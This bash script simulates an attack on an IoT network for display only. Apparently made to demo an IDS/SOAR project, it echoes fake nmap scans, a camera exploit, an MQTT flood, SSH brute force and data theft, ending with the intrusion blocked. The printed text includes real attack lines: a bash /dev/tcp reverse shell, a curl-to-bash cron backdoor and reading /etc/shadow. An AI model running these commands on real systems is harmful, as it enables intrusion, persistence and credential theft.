#!/bin/bash
# ═══════════════════════════════════════════════════════════
#  DEMO ATTACK SIMULATOR  —  Kali Linux Terminal
#  Everything here is FAKE / DISPLAY ONLY
#  No actual network traffic is generated
# ═══════════════════════════════════════════════════════════

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
DIM='\033[2m'
BLINK='\033[5m'
NC='\033[0m' # No Color

TARGET_IP="192.168.1.43"
CAMERA_IP="192.168.50.10"
BYOD_IP="192.168.50.40"
ATTACKER_IP="10.0.0.77"

sleep_rand() {
  sleep $(awk "BEGIN{print $1 + rand() * $2}" 2>/dev/null || sleep $1)
}

print_banner() {
  clear
  echo -e "${RED}${BOLD}"
  echo "  ██╗  ██╗ █████╗ ██╗     ██╗    ██╗      █████╗ ██████╗ "
  echo "  ██║ ██╔╝██╔══██╗██║     ██║    ██║     ██╔══██╗██╔══██╗"
  echo "  █████╔╝ ███████║██║     ██║    ██║     ███████║██████╔╝"
  echo "  ██╔═██╗ ██╔══██║██║     ██║    ██║     ██╔══██║██╔══██╗"
  echo "  ██║  ██╗██║  ██║███████╗██║    ███████╗██║  ██║██████╔╝"
  echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝    ╚══════╝╚═╝  ╚═╝╚═════╝ "
  echo -e "${NC}"
  echo -e "${DIM}  [ Offensive Security Research Framework v4.2.1 ]${NC}"
  echo -e "${DIM}  [ Author: r00tk1t | Target: IoT Network Segment ]${NC}"
  echo ""
  echo -e "${YELLOW}  [!] INITIATING ATTACK SEQUENCE AGAINST IoT INFRASTRUCTURE${NC}"
  echo -e "${DIM}  ─────────────────────────────────────────────────────────${NC}"
  echo ""
  sleep 1.5
}

phase_recon() {
  echo -e "${CYAN}${BOLD}[PHASE 1] RECONNAISSANCE & NETWORK DISCOVERY${NC}"
  echo -e "${DIM}  ─────────────────────────────────────────────${NC}"
  sleep 0.5

  echo -e "${WHITE}  \$ nmap -sn 192.168.1.0/24 --min-rate 1000${NC}"
  sleep 0.8
  echo -e "${GREEN}  Starting Nmap 7.94 ( https://nmap.org ) at $(date '+%Y-%m-%d %H:%M:%S')${NC}"
  sleep 0.3
  echo -e "  Nmap scan report for 192.168.1.1"
  echo -e "  ${GREEN}Host is up${NC} (0.0021s latency)."
  sleep 0.2
  echo -e "  Nmap scan report for ${TARGET_IP}"
  echo -e "  ${GREEN}Host is up${NC} (0.0018s latency)."
  sleep 0.2
  echo -e "  Nmap scan report for 192.168.50.10"
  echo -e "  ${GREEN}Host is up${NC} (0.0034s latency)."
  sleep 0.2
  echo -e "  Nmap scan report for 192.168.50.40"
  echo -e "  ${GREEN}Host is up${NC} (0.0041s latency)."
  sleep 0.5
  echo -e "  Nmap done: ${YELLOW}256 IP addresses (4 hosts up)${NC} scanned in 2.31s"
  echo ""
  sleep 0.8

  echo -e "${WHITE}  \$ nmap -sV -sS -p- --open ${TARGET_IP} -T4${NC}"
  sleep 1.2
  echo -e "${GREEN}  Starting Nmap aggressive scan...${NC}"
  sleep 0.4

  local ports=("22/tcp  open  ssh       OpenSSH 8.9p1"
               "80/tcp  open  http      nginx 1.22.0"
               "443/tcp open  https     nginx 1.22.0"
               "5432/tcp open postgresql PostgreSQL 14.5"
               "8000/tcp open  http-alt  uvicorn/FastAPI"
               "9090/tcp open  http      Prometheus 2.40"
               "9091/tcp open  http      metrics exporter")

  for port in "${ports[@]}"; do
    sleep 0.3
    echo -e "  ${GREEN}$port${NC}"
  done

  sleep 0.5
  echo ""
  echo -e "  ${YELLOW}[+] Service detection performed. 7 open ports found.${NC}"
  echo -e "  ${RED}[!] VULNERABLE: Port 8000 — FastAPI unauthenticated endpoint detected${NC}"
  echo ""
  sleep 1.5
}

phase_scan() {
  echo -e "${CYAN}${BOLD}[PHASE 2] IoT DEVICE FINGERPRINTING${NC}"
  echo -e "${DIM}  ─────────────────────────────────────────────${NC}"
  sleep 0.5

  echo -e "${WHITE}  \$ nmap -sV -p 554,8080,80 ${CAMERA_IP} --script rtsp-url-brute${NC}"
  sleep 1.0
  echo -e "  Scanning IP Camera at ${CAMERA_IP}..."
  sleep 0.4
  echo -e "  ${GREEN}554/tcp  open  rtsp   Live555 RTSP server${NC}"
  echo -e "  ${GREEN}80/tcp   open  http   Hikvision IP Camera webserver${NC}"
  sleep 0.3
  echo -e "  ${YELLOW}  | rtsp-url-brute:${NC}"
  echo -e "  ${YELLOW}  |   /stream1 — SUCCESS (no auth required!)${NC}"
  echo -e "  ${RED}  |_  CRITICAL: Unauthenticated RTSP stream accessible${NC}"
  echo ""
  sleep 0.8

  echo -e "${WHITE}  \$ nmap -sV -p 23,22,8080 ${BYOD_IP}${NC}"
  sleep 1.0
  echo -e "  Scanning BYOD Mobile at ${BYOD_IP}..."
  sleep 0.4
  echo -e "  ${GREEN}23/tcp   open  telnet Android Debug Bridge${NC}"
  echo -e "  ${YELLOW}  [!] ADB over network enabled — device exploitable${NC}"
  echo ""
  sleep 1.5
}

phase_exploit_camera() {
  echo -e "${CYAN}${BOLD}[PHASE 3] EXPLOITING IP CAMERA — RTSP HIJACK${NC}"
  echo -e "${DIM}  ─────────────────────────────────────────────${NC}"
  sleep 0.5

  echo -e "${WHITE}  \$ python3 exploit/rtsp_hijack.py --target ${CAMERA_IP} --port 554${NC}"
  sleep 0.8
  echo -e "  ${YELLOW}[*] Connecting to rtsp://${CAMERA_IP}:554/stream1 ...${NC}"
  sleep 0.6
  echo -e "  ${GREEN}[+] Connected! Stream captured.${NC}"
  sleep 0.4
  echo -e "  ${YELLOW}[*] Injecting malformed DESCRIBE request...${NC}"
  sleep 0.8

  local i=0
  while [ $i -lt 8 ]; do
    sleep 0.25
    printf "  ${RED}[>] Sending payload chunk $((i+1))/8 [$(printf '█%.0s' $(seq 1 $((i+1))))$(printf '░%.0s' $(seq 1 $((7-i))))]${NC}\n"
    i=$((i+1))
  done

  sleep 0.5
  echo -e "  ${RED}${BOLD}[!] OVERFLOW TRIGGERED — RCE achieved on ${CAMERA_IP}${NC}"
  sleep 0.3
  echo -e "  ${GREEN}[+] Spawning reverse shell: ${ATTACKER_IP}:4444${NC}"
  sleep 0.5
  echo -e "  ${GREEN}[+] Shell received! id: uid=0(root) gid=0(root)${NC}"
  echo ""
  sleep 1.5
}

phase_mqtt_flood() {
  echo -e "${CYAN}${BOLD}[PHASE 4] MQTT BROKER FLOOD ATTACK${NC}"
  echo -e "${DIM}  ─────────────────────────────────────────────${NC}"
  sleep 0.5

  echo -e "${WHITE}  \$ python3 exploit/mqtt_flood.py --broker ${TARGET_IP} --port 1883 --rate 5000${NC}"
  sleep 0.8
  echo -e "  ${YELLOW}[*] Connecting to MQTT broker at ${TARGET_IP}:1883 ...${NC}"
  sleep 0.4
  echo -e "  ${GREEN}[+] Connected (no auth required!)${NC}"
  sleep 0.3
  echo -e "  ${YELLOW}[*] Starting flood — 5000 msg/sec${NC}"
  sleep 0.3

  local count=0
  while [ $count -lt 12 ]; do
    local msgs=$((RANDOM % 500 + 4800))
    local drop=$((RANDOM % 5))
    sleep 0.4
    printf "\r  ${RED}[>] Published: %6d msgs | Queue depth: %2d | Broker CPU: %d%%${NC}   " \
      $((count * 5000 + msgs)) $((RANDOM % 15 + 5)) $((RANDOM % 40 + 55))
    count=$((count+1))
  done

  echo ""
  sleep 0.5
  echo -e "  ${RED}[!] Broker queue SATURATED — 60000+ messages injected${NC}"
  echo -e "  ${YELLOW}[*] IoT sensors disconnecting due to broker overload...${NC}"
  echo ""
  sleep 1.5
}

phase_ssh_brute() {
  echo -e "${CYAN}${BOLD}[PHASE 5] SSH BRUTE FORCE — BACKEND SERVER${NC}"
  echo -e "${DIM}  ─────────────────────────────────────────────${NC}"
  sleep 0.5

  echo -e "${WHITE}  \$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://${TARGET_IP} -t 4${NC}"
  sleep 1.0
  echo -e "  ${YELLOW}[*] Hydra v9.4 — brute forcing SSH on ${TARGET_IP}:22${NC}"
  sleep 0.4

  local attempts=0
  local passwords=("123456" "password" "admin" "root123" "toor" "qwerty" "letmein" "abc123" "master" "hello123")
  for pwd in "${passwords[@]}"; do
    sleep 0.35
    if [ "$pwd" = "master" ]; then
      echo -e "  ${RED}[ATTEMPT ${attempts}] root:${pwd} — ${GREEN}SUCCESS!${NC}"
    else
      echo -e "  ${DIM}[ATTEMPT ${attempts}] root:${pwd} — FAILED${NC}"
    fi
    attempts=$((attempts+1))
  done

  sleep 0.5
  echo -e "  ${GREEN}[+] VALID CREDENTIAL FOUND: root:master${NC}"
  echo -e "  ${RED}[!] SSH access to ${TARGET_IP} COMPROMISED${NC}"
  echo ""
  sleep 1.5
}

phase_c2() {
  echo -e "${CYAN}${BOLD}[PHASE 6] ESTABLISHING C2 — PERSISTENCE${NC}"
  echo -e "${DIM}  ─────────────────────────────────────────────${NC}"
  sleep 0.5

  echo -e "${WHITE}  \$ ssh root@${TARGET_IP} 'bash -i >& /dev/tcp/${ATTACKER_IP}/4444 0>&1'${NC}"
  sleep 1.0
  echo -e "  ${GREEN}[+] Reverse shell established${NC}"
  sleep 0.3
  echo -e "  ${YELLOW}[*] Dropping persistence payload...${NC}"
  sleep 0.5
  echo -e "  ${WHITE}  root@backend-pc:~# echo '* * * * * curl -s http://${ATTACKER_IP}/b.sh | bash' >> /etc/crontab${NC}"
  sleep 0.4
  echo -e "  ${GREEN}  [+] Cron backdoor installed${NC}"
  sleep 0.3
  echo -e "  ${WHITE}  root@backend-pc:~# cat /etc/shadow | grep -v '!!\|*'${NC}"
  sleep 0.5
  echo -e "  ${RED}  root:\$6\$xyz\$hash123...  [HASH CAPTURED]${NC}"
  echo -e "  ${RED}  ubuntu:\$6\$abc\$hash456...  [HASH CAPTURED]${NC}"
  sleep 0.3
  echo -e "  ${WHITE}  root@backend-pc:~# ps aux | grep postgres${NC}"
  sleep 0.3
  echo -e "  ${GREEN}  postgres  1234  0.1  2.3  /usr/bin/postgres -D /var/lib/pgsql/data${NC}"
  sleep 0.3
  echo -e "  ${YELLOW}  [*] Database server identified — attempting data exfiltration...${NC}"
  sleep 0.8
  echo -e "  ${RED}  [!] EXFILTRATING: fyp_security database → ${ATTACKER_IP}:8443${NC}"
  sleep 0.4

  local i=0
  while [ $i -lt 5 ]; do
    sleep 0.3
    echo -e "  ${RED}      [>>] Sending chunk $((i+1))/5 ($(( (i+1)*20 ))%)...${NC}"
    i=$((i+1))
  done

  echo -e "  ${RED}  [!] DATA EXFILTRATION COMPLETE — 47.2 MB transferred${NC}"
  echo ""
  sleep 1.5
}

phase_soar_trigger() {
  echo -e "${CYAN}${BOLD}[PHASE 7] IDS DETECTION — SOAR RESPONSE TRIGGERED${NC}"
  echo -e "${DIM}  ─────────────────────────────────────────────${NC}"
  sleep 0.5

  echo -e "  ${YELLOW}[*] Continuing lateral movement to IoT subnet...${NC}"
  sleep 0.5
  echo -e "${WHITE}  \$ arp-scan --interface=eth0 192.168.50.0/24${NC}"
  sleep 0.8

  echo -e "  ${YELLOW}[WARNING] ${RED}IDS ALERT TRIGGERED — Anomaly score: 0.97${NC}"
  sleep 0.3
  echo -e "  ${RED}[!] SOAR playbook 'block_attacker' EXECUTED${NC}"
  sleep 0.3
  echo -e "  ${RED}[!] UFW rule added: deny from ${ATTACKER_IP}${NC}"
  sleep 0.3
  echo -e "  ${RED}[!] SOAR playbook 'camera_defense' EXECUTED${NC}"
  sleep 0.3
  echo -e "  ${RED}[!] Rate-limit applied on ${CAMERA_IP}:554${NC}"
  sleep 0.5
  echo ""
  echo -e "  ${WHITE}[*] Attempting to bypass firewall rule...${NC}"
  sleep 0.8
  echo -e "  ${WHITE}\$ ssh -p 8080 root@${TARGET_IP} -o ProxyJump=${ATTACKER_IP}${NC}"
  sleep 0.6
  echo -e "  ${RED}  ssh: connect to host ${TARGET_IP} port 8080: Connection refused${NC}"
  sleep 0.3
  echo -e "  ${RED}  [!] BLOCKED by IDS firewall — connection dropped${NC}"
  echo ""
  sleep 1.0
}

summary() {
  echo -e "${DIM}  ─────────────────────────────────────────────────────────${NC}"
  echo -e "${BOLD}${YELLOW}  ATTACK SUMMARY${NC}"
  echo -e "${DIM}  ─────────────────────────────────────────────────────────${NC}"
  echo ""
  echo -e "  ${GREEN}[✓]${NC} Network reconnaissance completed"
  echo -e "  ${GREEN}[✓]${NC} 4 hosts discovered, 7 open ports identified"
  echo -e "  ${GREEN}[✓]${NC} IP Camera (${CAMERA_IP}) — RTSP hijack successful"
  echo -e "  ${GREEN}[✓]${NC} MQTT broker (${TARGET_IP}:1883) — flood attack executed"
  echo -e "  ${GREEN}[✓]${NC} SSH brute force — credential: root:master"
  echo -e "  ${GREEN}[✓]${NC} C2 persistence established"
  echo -e "  ${GREEN}[✓]${NC} Database exfiltration: 47.2 MB"
  echo -e "  ${RED}[✗]${NC} Lateral movement BLOCKED by IDS/SOAR"
  echo ""
  echo -e "  ${RED}${BOLD}  ⚠  IDS SYSTEM DETECTED AND BLOCKED FINAL STAGE ⚠${NC}"
  echo -e "  ${DIM}     All activity logged to SIEM — analyst alerted${NC}"
  echo ""
  echo -e "${DIM}  ─────────────────────────────────────────────────────────${NC}"
  echo ""
}

# ── MAIN ──────────────────────────────────────────────────────────────────────
print_banner
phase_recon
phase_scan
phase_exploit_camera
phase_mqtt_flood
phase_ssh_brute
phase_c2
phase_soar_trigger
summary
